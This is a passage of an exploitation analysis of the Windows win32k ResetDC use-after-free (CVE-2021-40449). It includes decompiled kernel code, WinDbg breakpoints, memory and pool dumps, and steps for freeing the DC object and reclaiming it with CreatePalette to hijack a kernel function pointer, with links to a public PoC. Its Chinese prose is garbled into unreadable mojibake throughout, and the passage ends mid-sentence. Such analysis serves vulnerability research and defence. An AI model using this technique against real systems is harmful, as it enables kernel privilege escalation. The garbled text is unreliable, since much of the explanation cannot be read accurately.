v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));// è°ƒç”¨å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°ï¼Œä¼ å…¥å‚æ•°ä¸ºç”¨æˆ·ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å†…çš„å€¼ Â·Â·Â·Â·Â·Â·Â· HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â· bDeleteDCInternal(v6, 1i64, 0i64); // ä¼ å…¥äº†hdcOpenDCWè¿”å›çš„HDCï¼Œä½†HmgSwapLockedHandleContentsäº¤æ¢äº†æ–°æ—§å¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œæ­¤æ—¶v6å¥æŸ„å¯¹åº”æ—§DCå¯¹è±¡ã€‚ Â·Â·Â·Â·Â·Â· è°ƒç”¨è¯¥å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæ‰€ç”¨çš„ä¸¤ä¸ªå‚æ•°ä¹Ÿæ˜¯æºäºç”¨æˆ·ä¼ å…¥çš„HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nv10 = *(_QWORD *)(v8 + 48);\t_\n_v14[308] = *(_QWORD *)(v25 + 2464);\nv14[309] = *(_QWORD *)(v25 + 2472);\nv15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64));\nåœ¨win32kfull!GreResetDCInternalå‡½æ•°çš„ååŠæ®µä¼šè°ƒç”¨win32kbase!DeleteDCInternalå‡½æ•°é‡Šæ”¾ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„æ‰€å¯¹åº”çš„DCå¯¹è±¡ï¼Œåˆ°è¿™é‡Œå°±è¾¾æˆäº†use-after-freeçš„freeæ­¥éª¤ã€‚\nHDC v3; v3=a1; v13 = (HDC)hdcOpenDCW(\u0026amp;qword_1C0141EB0, v26, 0i64, 0i64, *(_QWORD *)(v10 + 2584));// åˆ›å»ºæ–°çš„HDC v6 = v13; if ( v13 ) { *(_QWORD *)(v10 + 2584) = 0i64; DCOBJ::DCOBJ((DCOBJ *)\u0026amp;v24, v13); v14 = (_QWORD *)v24; if ( v24 ) { if ( v12 ) *(_DWORD *)(v24 + 120) = *(_DWORD *)(v24 + 116); v14[308] = *(_QWORD *)(v25 + 2464); *(_QWORD *)(v25 + 2464) = 0i64; v14[309] = *(_QWORD *)(v25 + 2472); *(_QWORD *)(v25 + 2472) = 0i64; v15 = *(void (__fastcall **)(_QWORD, _QWORD))(v10 + 2768); if ( v15 ) v15(*(_QWORD *)(v10 + 1824), *(_QWORD *)(v14[6] + 1824i64)); GreAcquireHmgrSemaphore(); LOBYTE(v23) = 1; HmgSwapLockedHandleContents(v3, 0i64, v6, 0i64, v23);// äº¤æ¢æ—§çš„å’Œæ–°çš„HDCå¯¹è±¡ GreReleaseHmgrSemaphore(); Â·Â·Â·Â·Â·Â·Â· // åˆ é™¤HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚ bDeleteDCInternal(v6, 1i64, 0i64); å¦‚æœåœ¨é‡Šæ”¾DCå¯¹è±¡ä¹‹åï¼Œé‡æ–°ç”³è¯·DCå¯¹è±¡ç©ºé—´ï¼Œä¿®æ”¹é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆå†…å®¹ï¼Œå¹¶é€šè¿‡æŸäº›æ­¥éª¤ï¼Œè®©å†…æ ¸æ‰§è¡ŒDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å¯è¾¾åˆ°useæ­¥éª¤è®©å†…æ ¸æ‰§è¡Œä»»æ„å†…æ ¸å‡½æ•°ã€‚\næ¼æ´åˆ©ç”¨åˆ†æ POC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\nPOCä»£ç åˆ†æï¼š\rhttps://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp\nè¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œéš¾ç‚¹åœ¨äºfree DCå¯¹è±¡ä¹‹åæ€ä¹ˆä½¿å¾—å†…æ ¸å†æ¬¡è°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨æ­£å¸¸GreResetDCInternalå‡½æ•°æµç¨‹ä¸­ï¼Œæ˜¯å…ˆè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå†åˆ é™¤è¿™ä¸ªå¯¹è±¡ï¼Œå³æŒ‰ç…§æ­£å¸¸æµç¨‹å³ä¸ä¼šæœ‰use-after-freeçš„æ¡ä»¶ã€‚\nåœ¨ring 3å±‚è°ƒç”¨ResetDCå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸è°ƒç”¨å‡½æ•°NtGdiResetDCï¼Œåœ¨NtGdiResetDCä¼šè°ƒç”¨æ¼æ´å‡½æ•°GreResetDCInternalï¼Œåœ¨GreResetDCInternalä¸­ä¼šè°ƒç”¨DCå¯¹è±¡é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆã€‚è¦åˆ©ç”¨è¯¥æ¼æ´å³è¦åœ¨è°ƒç”¨å‡½æ•°æŒ‡é’ˆä¹‹å‰å®Œæˆä¸‰æ­¥åŠ¨ä½œï¼š1ã€é‡Šæ”¾DCå¯¹è±¡2ã€é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´3ã€å®Œæˆå†…å­˜ç©ºé—´çš„å¸ƒå±€ã€‚\nåœ¨å‡½æ•°GreResetDCInternalè°ƒç”¨DCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆä¹‹å‰ä¼šè°ƒç”¨win32kbase!hdcOpenDCWå‡½æ•°ã€‚win32kbase!hdcOpenDCWå‡½æ•°ä¼šæ‰§è¡Œæ‰“å°æœºé©±åŠ¨çš„ç”¨æˆ·æ€å›è°ƒå‡½æ•°è¡¨é‡Œé¢çš„å‡½æ•°ï¼Œè¯¥è¡¨é‡Œé¢å­˜æ”¾äº†å‡½æ•°æŒ‡é’ˆï¼Œè¯¥å‡½æ•°æŒ‡é’ˆåŸå…ˆæŒ‡å‘çš„æ˜¯é¢„å®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚åœ¨POCä¸­è¦†ç›–è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä½¿å…¶æ‰§è¡ŒPOCå®šä¹‰çš„å›è°ƒå‡½æ•°ã€‚\nåœ¨è‡ªå®šä¹‰å›è°ƒå‡½æ•°ä¸­å†æ¬¡æ‰§è¡ŒResetDCå‡½æ•°å¹¶ä¼ å…¥åŒä¸€HDCå¥æŸ„ï¼Œåˆ™ä¼šå†æ¬¡æ‰§è¡ŒNtGdiResetDCå’ŒGreResetDCInternalå‡½æ•°ï¼Œè€Œåœ¨GreResetDCInternalçš„ååŠæ®µï¼Œä¼šé‡Šæ”¾ä¼ å…¥çš„HDCå¯¹åº”çš„DCå¯¹è±¡å¹¶åˆ›å»ºæ–°çš„DCå¯¹è±¡ã€‚æ­¤æ—¶è¾¾åˆ°äº†freeæ­¥éª¤ã€‚\nåœ¨ç¬¬äºŒæ¬¡ResetDCè°ƒç”¨å®Œæˆåï¼ŒåŸDCå¯¹è±¡å·²è¢«é‡Šæ”¾ï¼Œæ­¤æ—¶å¯ä»¥é‡æ–°ç”³è¯·åŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å¹¶å®Œæˆå†…å­˜å¸ƒå±€ï¼Œå°†åŸDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆå’Œå‡½æ•°æŒ‡é’ˆçš„å‚æ•°çš„ä½ç½®è®¾ç½®ä¸ºæƒ³è¦æ‰§è¡Œçš„å†…æ ¸å‡½æ•°çš„åœ°å€åŠå‚æ•°ã€‚åœ¨æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡å›è°ƒä¹‹åï¼ŒGreResetDCInternal å°†è°ƒç”¨åŸDCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆï¼Œå³å®Œæˆäº†ä»»æ„å†…æ ¸å‡½æ•°è°ƒç”¨ï¼Œæ­¤æ—¶è¾¾åˆ°äº†useæ­¥éª¤ã€‚\nå®Œæ•´è°ƒç”¨é“¾å¦‚ä¸‹å›¾ï¼š\nå…¶ä¸­æ¼æ´ç›¸å…³çš„ç±»å®šä¹‰å¦‚ä¸‹ï¼Œå‚è€ƒhttps://github.com/ZoloZiak/WinNT4/blob/master/private/ntos/w32/ntgdi/gre/dcobj.hxx#L97\nclass DCLEVEL { public: ... HDC hdcSave; ... } class DC : public OBJECT { public: DHPDEV dhpdev_; PDEV *ppdev_; ... HDC hdcNext_; // HDCé“¾è¡¨æŒ‡é’ˆ HDC hdcPrev_; ... DCLEVEL dclevel ... }; typedef DC *PDC; class XDCOBJ /* dco */ { public: PDC pdc; ... }; typedef XDCOBJ *PXDCOBJ; class DCOBJ : public XDCOBJ /* mdo */ { public: DCOBJ() { pdc = (PDC) NULL; } DCOBJ(HDC hdc) { vLock(hdc); } ~DCOBJ() { vUnlockNoNullSet(); } }; typedef DCOBJ *PDCOBJ; ç±»ä¹‹é—´çš„å…³ç³»å¯ä»¥ç®€åŒ–ä¸ºä¸‹å›¾ï¼š\nè°ƒè¯• freeéƒ¨åˆ† åœ¨freeéƒ¨åˆ†éœ€è¦æŠŠæˆ‘ä»¬æƒ³è¦é‡Šæ”¾çš„å†…å­˜ç©ºé—´é‡Šæ”¾ï¼Œå¹¶è®©åé¢çš„useéƒ¨åˆ†æˆåŠŸç”³è¯·åˆ°è¿™å—å†…å­˜ç©ºé—´ã€‚\nè°ƒè¯•ç¯å¢ƒï¼šè™šæ‹Ÿæœºwindows 10 1607ã€ç‰©ç†æœºwindows 10 2004\nPOC:\rhttps://github.com/KaLendsi/CVE-2021-40449-Exploit\næ–­ç‚¹:\nbp win32kfull!NtGdiResetDC bp win32kfull!NtGdiResetDC+0xc1 \u0026#34;è°ƒç”¨GreResetDCInternalå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x3a \u0026#34;è°ƒç”¨DCOBJæ„é€ å‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x116 \u0026#34;è°ƒç”¨_imp_hdcOpenDCWå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x136 \u0026#34;ç¬¬äºŒæ¬¡DCOBJ\u0026#34; bp win32kfull!GreResetDCInternal+0x1b5 \u0026#34;è°ƒç”¨DCå¯¹è±¡å‡½æ•°æŒ‡é’ˆ\u0026#34; bp win32kfull!GreResetDCInternal+0x1d1 \u0026#34;è°ƒç”¨HmgSwapLockedHandleå‡½æ•°\u0026#34; bp win32kfull!GreResetDCInternal+0x20d \u0026#34;è°ƒç”¨_imp_bDeleteDCInternalå‡½æ•°\u0026#34; bp cve_2021_40449!hook_DrvEnablePDEV+0x12a \u0026#34;å¾ªç¯è°ƒç”¨\u0026#34; bp win32kbase!PALMEMOBJ::bCreatePalette \u0026#34;è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePalette\u0026#34; è¿è¡ŒPOCï¼Œæ–­ç‚¹bp win32kfull!NtGdiResetDCè§¦å‘æ­¤æ—¶ä¼ å…¥çš„å¥æŸ„ä¸ºrcx=00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ä¼ å…¥å„ä¸ªå‚æ•°ä¸ºrcx=00000000092105f1 rdx=0000000000000000 r8=ffffb101aadf2a44 å³ç¬¬ä¸€ä¸ªå¥æŸ„å€¼ä¸º00000000092105f1\nç¬¬ä¸€æ¬¡è°ƒç”¨æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ï¼Œæ­¤æ—¶rbxå­˜æ”¾DCOå¯¹è±¡çš„åœ°å€ï¼Œ\næ ¹æ®æ¼æ´å½¢æˆåˆ†æçš„è®¡ç®—å…¬å¼ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å¾—åˆ°DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆæŒ‡å‘çš„å‡½æ•°çš„åœ°å€ä¸ºï¼šffffd548a1f10c30\n1: kd\u0026gt; dq rax ffffb101`aadf29c0 ffffd50e`041fd010 00000000`00000001 ffffb101`aadf29d0 00000268`6e766b20 000000d7`97aff680 ffffb101`aadf29e0 00000000`00000000 00000000`092105f1 ffffb101`aadf29f0 00000000`00000000 ffffd50e`041fb030 ffffb101`aadf2a00 ffffb101`aadf2b80 ffffd548`a1f18fe6 ffffb101`aadf2a10 00000000`00000001 00000000`00000000 ffffb101`aadf2a20 ffffb101`aadf2a44 ffffd50e`041fb030 ffffb101`aadf2a30 000000d7`97aff5d0 00000000`00000000 // rbxå­˜æ”¾äº†æ„é€ å‡½æ•°äº§ç”Ÿçš„DCOå¯¹è±¡åœ°å€ 1: kd\u0026gt; dq rbx ffffd50e`041fd010 00000000`092105f1 80000001`00000000 ffffd50e`041fd020 ffffd800`b45ad780 00000268`6e75ea10 ffffd50e`041fd030 00100010`00000000 00000000`00000000 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 // ffffd50e`041fd010ä¸ºrbxçš„å€¼ï¼Œæ­¤å¤„ffffd50e`041fd010+0x30ä¸ºPDCçš„åœ°å€ï¼ŒPDCæŒ‡å‘DCå¯¹è±¡å³DCå¯¹è±¡åœ°å€ä¸ºffffd50e`00052030 // è®¡ç®—å…¬å¼ *(dcoåœ°å€+0x30)=dcåœ°å€ 1: kd\u0026gt; dq ffffd50e`041fd010+0x30 ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ffffd50e`041fd050 ffffd800`b56f1260 00000009`1000a01f ffffd50e`041fd060 ffffd50e`041fd3d0 00000000`0088000b ffffd50e`041fd070 ffffd50e`000004f0 ffffd50e`00005d90 ffffd50e`041fd080 00000001`00000000 00000000`00000000 ffffd50e`041fd090 00000000`00000000 00000000`00000000 ffffd50e`041fd0a0 ffffd50e`00001a10 ffffd50e`00004cb0 ffffd50e`041fd0b0 ffffd50e`000105f0 00000000`00000000 // ffffd50e`00052030+0xad0å¤„ä¸ºDCå¯¹è±¡çš„å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªå‡½æ•° // è®¡ç®—å…¬å¼ *(dcåœ°å€ +0xad0)=å‡½æ•°åœ°å€ 1: kd\u0026gt; dq ffffd50e`00052030+0xad0 ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 ffffd50e`00052b10 00000000`00000000 00000000`00000000 ffffd50e`00052b20 00000000`00000000 ffffd548`a1f10930 ffffd50e`00052b30 00000000`00000000 ffffd548`a1f11dc0 ffffd50e`00052b40 ffffd548`a1f0e6b0 ffffd548`a1f11b00 ffffd50e`00052b50 00000000`00000000 ffffd548`a1f0cd70 ffffd50e`00052b60 ffffd548`a1f0d1f0 ffffd548`a1f112f0 ffffd50e`00052b70 00000000`00000000 00000000`00000000 // ä»¥ä¸‹ä¸ºå‡½æ•°çš„æ±‡ç¼– 1: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx ä¹‹åé€šè¿‡hdcOpenDCWå‡½æ•°è°ƒç”¨ç”¨æˆ·æ¨¡å¼çš„å›è°ƒå‡½æ•°ï¼Œåœ¨å›è°ƒå‡½æ•°ä¸­å†æ¬¡è°ƒç”¨ResetDCå‡½æ•°ï¼Œæ­¤æ—¶ä¼ å…¥çš„HDCå’Œç¬¬ä¸€æ¬¡è°ƒç”¨ResetDCçš„æ˜¯åŒä¸€ä¸ªå¥æŸ„ã€‚\nç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!GreResetDCInternal æ—¶ï¼Œä¼ å…¥åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œå³å¯¹åº”åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\n0: kd\u0026gt; t win32kfull!GreResetDCInternal: ffffd548`a1f03e58 488bc4 mov rax,rsp 1: kd\u0026gt; rrcx rcx=00000000092105f1 ç¬¬äºŒæ¬¡è°ƒç”¨DCOBJæ„é€ å‡½æ•°æ—¶ï¼Œç”±äºä¼ å…¥çš„æ˜¯åŒä¸€ä¸ªHDCå¥æŸ„ï¼Œæ‰€ä»¥HDCå¥æŸ„å¼•ç”¨æ¬¡æ•°+1ï¼ŒåŒæ—¶ä¸¤æ¬¡è°ƒç”¨æ„é€ å‡½æ•°æ„é€ çš„å¯¹è±¡å…³è”åˆ°åŒä¸€ä¸ªDCå¯¹è±¡ã€‚\nä¹‹åç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!_imp_hdcOpenDCWå‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°å†…æ‰§è¡Œæ”¿ç­–å›è°ƒå‡½æ•°ï¼Œwin32kfull!imp_hdcOpenDCWè¿”å›ä¸€ä¸ªHDCå¥æŸ„å€¼ä¸º0000000003210041ï¼Œå³åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„DCå¯¹è±¡ã€‚ä¹‹åé€šè¿‡æ–°åˆ›å»ºçš„DCå¯¹è±¡åˆ›å»ºDCOå¯¹è±¡ã€‚\nåœ¨win32kfull!GreResetDCInternalååŠæ®µä¼šè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsäº¤æ¢ç¬¬ä¸€ä¸ªHDCå¥æŸ„å’Œç¬¬äºŒæ¬¡è°ƒç”¨win32kfull!imp_hdcOpenDCWåˆ›å»ºçš„HDCå¥æŸ„ã€‚\nè°ƒç”¨win32kfull!_imp_HmgSwapLockedHandleContentsä¹‹åä¸¤ä¸ªå¥æŸ„å¯¹åº”çš„DCå†…å®¹ä¸ºå·²ç»å‘ç”Ÿäº†äº¤æ¢\n// ä»¥ä¸‹å†…å®¹ä¸ºæ—§DCå¯¹è±¡ï¼Œä½†æ˜¯å¥æŸ„ä¸ºæ–°å¥æŸ„ 1: kd\u0026gt; dq ffffd50e041fd010 ffffd50e`041fd010 00000000`03210041 80000001`00000000 ...... 1: kd\u0026gt; dq ffffd50e03fee010 // ä»¥ä¸‹å†…å®¹ä¸ºæ–°DCå¯¹è±¡ï¼Œä½†å¥æŸ„ä¸ºæ—§å¥æŸ„ ffffd50e`03fee010 00000000`092105f1 80000002`00000000 ...... ä¹‹åè°ƒç”¨win32kfull!_imp_bDeleteDCInternalä¼ å…¥HDCå¥æŸ„ï¼Œè¯¥å‡½æ•°ä¼šé‡Šæ”¾HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ï¼Œè€Œæ­¤æ—¶ä¼ å…¥è¯¥å‡½æ•°çš„HDCå¥æŸ„ä¸ºç¬¬äºŒæ¬¡è°ƒç”¨hdcOpenDCWå‡½æ•°è¿”å›çš„å¥æŸ„ï¼Œä½†ä¹‹å‰äº¤æ¢è¿‡æ–°æ—§å¥æŸ„ï¼Œæ‰€ä»¥å®é™…ä¸Šé‡Šæ”¾çš„æ˜¯æ—§HDCå¥æŸ„å¯¹åº”çš„DCå¯¹è±¡ã€‚\nä¹‹å‰è®¡ç®—å‡½æ•°æŒ‡é’ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬çŸ¥é“DCO +0x30æ˜¯æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆï¼Œæ‰€ä»¥åœ¨è°ƒç”¨win32kfull!_imp_bDeleteDCInternalå‡½æ•°ä¹‹åï¼ŒåŸDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾ï¼Œè¾¾æˆäº†use-after-freeçš„ç¬¬ä¸€æ­¥freeã€‚\nfunction pointer=* (* (DCO +0x30)+0xad0)ï¼Œå…¶ä¸­DCO +0x30å³æŒ‡å‘DCå¯¹è±¡çš„æŒ‡é’ˆ\n0: kd\u0026gt; dq ffffd50e041fd010+0x30 // å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 ...... 0: kd\u0026gt; !pool ffffd50e`00052030 // DCå¯¹è±¡çš„å†…å­˜å·²è¢«é‡Šæ”¾ï¼Œå¤§å°ä¸ºe30 Pool page ffffd50e00052030 region is Paged session pool *ffffd50e00052000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffffd50e00052e30 size: 10 previous size: e30 (Free) Free ffffd50e00052e40 size: 1c0 previous size: 10 (Allocated) Usqu ä¹‹ååªéœ€è¦ç”³è¯·è¿™å—å†…å­˜ç©ºé—´å¹¶æ„é€ ï¼Œåˆšåˆ é™¤çš„æ—¶å€™ï¼Œè™½ç„¶DCå¯¹è±¡å·²ç»è¢«é‡Šæ”¾ï¼Œä½†å‡½æ•°æŒ‡é’ˆè¿˜æ˜¯æŒ‡å‘æ­£ç¡®çš„å‡½æ•°åœ°å€ï¼Œæ¥ä¸‹æ¥å°±è¦ç”³è¯·ç©ºé—´ï¼Œè¦†ç›–è¿™å—å†…å­˜ç©ºé—´çš„å‡½æ•°æŒ‡é’ˆçš„å€¼å³å¯ã€‚\n0: kd\u0026gt; dq ffffd50e041fd010+0x30\t// å–DCå¯¹è±¡åœ°å€ ffffd50e`041fd040 ffffd50e`00052030 00000000`00000000 0: kd\u0026gt; dq ffffd50e`00052030+0xad0\t// å–DCå¯¹è±¡å†…çš„å‡½æ•°æŒ‡é’ˆ ffffd50e`00052b00 ffffd548`a1f10c30 ffffd548`a1db18c0 0: kd\u0026gt; u ffffd548`a1f10c30 win32kfull!UMPDDrvResetPDEV: ffffd548`a1f10c30 48895c2418 mov qword ptr [rsp+18h],rbx ffffd548`a1f10c35 4889742420 mov qword ptr [rsp+20h],rsi ffffd548`a1f10c3a 57 push rdi ffffd548`a1f10c3b 4883ec70 sub rsp,70h ffffd548`a1f10c3f 488b05ba440800 mov rax,qword ptr [win32kfull!_security_cookie (ffffd548`a1f95100)] ffffd548`a1f10c46 4833c4 xor rax,rsp ffffd548`a1f10c49 4889442468 mov qword ptr [rsp+68h],rax ffffd548`a1f10c4e 488bf9 mov rdi,rcx use éƒ¨åˆ† æ³¨ï¼šæ­¤éƒ¨åˆ†ä¸ºç¬¬äºŒæ¬¡è°ƒè¯•ï¼Œæ‰€ä»¥å¥æŸ„ã€å†…å­˜åœ°å€å’Œå‰éƒ¨åˆ†ä¸ä¸€æ ·ã€‚\nåœ¨pocé‡Œé¢ä¼šè°ƒç”¨CreatePaletteå‡½æ•°ï¼Œè¯¥æ­¤å‡½æ•°ä¼šç”³è¯·å†…æ ¸å †ï¼Œ\nç¬¬ä¸€ä¸ªå¥æŸ„rcx=0000000015213372\n// ç¬¬ä¸€ä¸ªDCOå¯¹è±¡ 0: kd\u0026gt; dq rbx DBGHELP: SharedUserData - virtual symbol module ffff885e`847d2620 00000000`15213372 80000001`00000000 ...... // ç¬¬ä¸€ä¸ªPDC æŒ‡å‘DCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`847d2620+0x30 ffff885e`847d2650 ffff885e`80063030 00000000`00000000 ...... // ç¬¬ä¸€ä¸ªDCå¯¹è±¡ 0: kd\u0026gt; dq ffff885e`80063030 ffff885e`80063030 00000000`00000000 00000000`00000000 ffff885e`80063040 00000000`00000000 ffff885e`80046010 ffff885e`80063050 00000001`00000001 ffff885e`80063030 ffff885e`80063060 00000000`00000000 00000000`00008180 ffff885e`80063070 ffffb48d`a36b4e50 00000000`00000000 ffff885e`80063080 00000000`00000000 00000000`00000000 ffff885e`80063090 00000000`00000000 00000000`00000000 ffff885e`800630a0 00000000`00000000 00000000`00000000 ç¬¬äºŒä¸ªå¥æŸ„rax=0000000001211b60\n1: kd\u0026gt; dq rdx DBGHELP: SharedUserData - virtual symbol module ffff885e`84121620 00000000`01211b60 80000001`00000000 ...... 1: kd\u0026gt; dq rdx+0x30 ffff885e`84121650 ffff885e`8006b030 00000000`00000000 ...... 1: kd\u0026gt; dq ffff885e`8006b030 ffff885e`8006b030 00000000`00000000 00000000`00000000 ffff885e`8006b040 00000000`00000000 ffff885e`80063030 ffff885e`8006b050 00000001`00000001 ffff885e`8006b030 ffff885e`8006b060 00000000`00000000 00000000`00008180 ffff885e`8006b070 ffffb48d`a317b8b0 00000000`00000000 ffff885e`8006b080 00000000`00000000 00000000`00000000 ffff885e`8006b090 00000000`00000000 00000000`00000000 ffff885e`8006b0a0 00000000`00000000 00000000`00000000 åœ¨DeleteDCInternelè°ƒç”¨ä¹‹åç¬¬ä¸€ä¸ªDCå¯¹è±¡çš„å†…å­˜ç©ºé—´å·²ç»è¢«é‡Šæ”¾\n0: kd\u0026gt; !pool ffff885e`80063030 // æ³¨æ„ï¼Œæ­¤æ—¶DCå¯¹è±¡åœ°å€è·ç¦»å †å¤´åœ°å€ä¸º0x30å¤§å° Pool page ffff885e80063030 region is Paged session pool *ffff885e80063000 size: e30 previous size: 0 (Free ) *GDev Pooltag GDev : Gdi pdev ffff885e80063e30 size: 70 previous size: e30 (Free) Free ffff885e80063ea0 size: b0 previous size: 70 (Free ) Usqm ffff885e80063f50 size: b0 previous size: b0 (Allocated) Usqm æ ¹æ®è°ƒè¯•ï¼Œå¯ä»¥å¾—çŸ¥é‡Šæ”¾çš„DCå¯¹è±¡å†…å­˜å¤§å°ä¸º0xe30ï¼Œæ‰€ä»¥è¦è¦†ç›–å‡½æ•°æŒ‡é’ˆæ—¶ï¼Œæ‰€ç”³è¯·çš„å†…å­˜ä¹Ÿè¦åˆšåˆšå¥½æˆ–è€…æ¥è¿‘è¿™å—å†…å­˜å¤§å°æ‰æœ‰å¯èƒ½ç”³è¯·åˆ°ã€‚åœ¨pocé‡Œé¢ï¼Œä½¿ç”¨CreatePaletteç”³è¯·è¿™å—å†…æ ¸å †ã€‚è¿™ä¸ªå‡½æ•°ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸å‡½æ•°win32kfull!NtGdiCreatePaletteInternalï¼Œè¯¥å‡½æ•°è°ƒç”¨win32kbase!PALMEMOBJ::bCreatePaletteåˆ›é€ Paletteå¯¹è±¡ï¼Œwin32kbase!PALMEMOBJ::bCreatePaletteä¼šè°ƒç”¨AllocateObjectä¸ºæ–°å¯¹è±¡ç”³è¯·ç©ºé—´ï¼Œæœ€ç»ˆé€šè¿‡è°ƒç”¨ExAllocatePoolWithTagå‡½æ•°åˆ†é…å †ç©ºé—´ï¼Œæ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š\n0: kd\u0026gt; kb # RetAddr : Call Site 00 ffff880c`b95d39f4 : win32kbase!Win32AllocPool 01 ffff880c`b95d0042 : win32kbase!AllocateObject+0xc4 02 ffff880c`b9309ecc : win32kbase!PALMEMOBJ::bCreatePalette+0xb2 03 fffff800`b175a193 : win32kfull!NtGdiCreatePaletteInternal+0xcc 04 00007ffe`a2cb2604 : nt!KiSystemServiceCopyEnd+0x13 05 00007ff7`e44c2fe1 : win32u!NtGdiCreatePaletteInternal+0x14 06 00000000`00000d94 : cve_2021_40449!createPaletteofSize1+0xd1 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 71] ....... 2e 00007ffe`a2e9b26f : 0x000000d1`a374ef69 2f 00007ffe`a39e1a4a : gdi32full!GdiPrinterThunk+0x21f 30 00007ffe`a61889e4 : USER32!__ClientPrinterThunk+0x3a 31 00007ffe`a2cb6dc4 : ntdll!KiUserCallbackDispatcherContinue 32 00007ffe`a2e7edda : win32u!NtGdiResetDC+0x14 33 00007ffe`a3682371 : gdi32full!ResetDCWInternal+0x17a 34 00007ff7`e44c3296 : GDI32!ResetDCW+0x31 35 00000000`00000000 : cve_2021_40449!main+0x146 [C:\\Users\\mimi\\source\\repos\\test\\cve-2021-40449\\main.cpp @ 685] win32kbase!Win32AllocPoolä»£ç å¦‚ä¸‹ï¼Œæœ€ç»ˆæ˜¯é€šè¿‡è°ƒç”¨ExAllocatePoolWithTagç”³è¯·å †ï¼Œwin32kbase!Win32AllocPoolçš„a1å‚æ•°ä¸ºè¦ç”³è¯·çš„å †å†…å­˜å¤§å°ï¼Œè°ƒè¯•è¿‡ç¨‹ä¸­å¯ä»¥å¾—çŸ¥å…¶è¦ç”³è¯·0xe20å¤§å°çš„å †ï¼ŒåŠ ä¸Šå †å¤´ï¼Œåˆšå¥½æ¥è¿‘åˆšé‡Šæ”¾çš„0xe3å¤§å°çš„å 